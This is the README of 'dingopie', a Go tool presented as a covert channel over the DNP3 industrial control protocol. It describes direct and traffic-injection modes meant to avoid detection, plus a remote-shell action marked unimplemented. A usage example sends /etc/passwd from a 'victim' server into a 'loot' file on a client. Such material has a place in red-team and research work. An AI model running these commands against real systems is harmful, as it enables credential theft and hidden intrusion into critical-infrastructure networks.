# dingopie :wolf: :cake:

> [D1N0P13](https://github.com/nblair2/d1n0p13) in Go...and better

#### `dingopie` is a DNP3 covert channel

![dingopie](.media/dingopie.png)

## Usage

dingopie has three different options: the role, the mode, and the action. Each is required: `dingopie {server|client} {direct|inject} {{send|receive}|{shell|connect}} ...`. Each session needs one of each roles, and one of each from a pair of actions.

Transfer a file from server to client in direct mode:
```bash
# On server
$ dingopie server direct send --file /etc/passwd --key secret
# on client
$ dingopie client direct receive --file loot/victim1-etc-passwd.txt --key secret --server-ip 10.1.2.3
```

### Roles

* **Server** - The server role is designed to act like a DNP3 outstation. The server needs to be started before the client.
* **Client** - The client role is designed to act like a DNP3 master.

### Modes

#### direct

In direct mode, dingopie creates a new DNP3 channel. Data is sent in DNP3 Application Objects. This traffic will be legitimate protocol-conforming DNP3, but is noticeable. It will originate on a port and host that are not already communicating using DNP3, and traffic inspection will likely show unusual usage, both in the amount of data transferred and the DNP3 characteristics. The advantage of direct mode is that it can be configured to run at high speeds, between any two devices.

#### inject

> [!WARNING]
> inject mode is not implemented yet

In inject mode, dingopie 'rides on top of' an existing DNP3 channel. Data is added to existing DNP3 packets (ostensibly created by a legitimate DNP3 program) as they leave one host, and on the other side this data is removed before allowing the packets to continue on to the legitimate DNP3 program. This will increase the size of packets sent between devices, but will take place over an existing DNP3 connection and is much less likely to be noticed. The disadvantage of filter mode is that its speed is constrained by the channel that it is using.

### Actions

Actions are paired, so that each side 

#### send|receive  

The send/receive action simply transfers data in one direction (either server to client or the reverse).

#### shell|connect

> [!WARNING]
> the shell|connect action  is not implemented yet

The shell/connect action creates a pty on one device and allows the connecting device to run an interactive shell.
